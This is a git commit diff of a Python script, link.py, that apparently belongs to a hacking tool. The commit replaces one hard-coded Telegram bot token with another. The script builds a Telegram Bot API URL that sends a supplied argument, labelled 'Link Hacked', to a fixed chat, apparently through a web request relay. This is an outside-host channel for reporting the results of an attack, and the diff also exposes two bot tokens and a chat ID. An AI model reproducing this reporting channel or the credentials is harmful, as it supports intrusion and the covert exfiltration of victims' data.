416569c8efeae72b8ddfc6e871fd75632fc016a0
MONSTER_SECURITY <69053807+MONSTER-hp@users.noreply.github.com>
2021-03-12 12:16:29 +0330

    Update link.py

--- link.py
+++ link.py
@@ -3,7 +3,7 @@ import platform
 import sys
 sys.argv[0]
 Example = sys.argv[1]
-url = "https://api.telegram.org/bot1611642670:AAEKRsaSXmhfVCYOVtJVEn9ccv36ekFmeew/SendMessage?chat_id=1119653364&text=Link Hacked >>> "+Example
+url = "https://api.telegram.org/bot1608836427:AAGn1y1BbMZtiRLnClGTODzJ7U32hdQr_kk/SendMessage?chat_id=1119653364&text=Link Hacked >>> "+Example
 payload = {"UrlBox":url,  
 "AgentList":"Mozilla Firefox",
 "VersionsList":"HTTP/1.1",
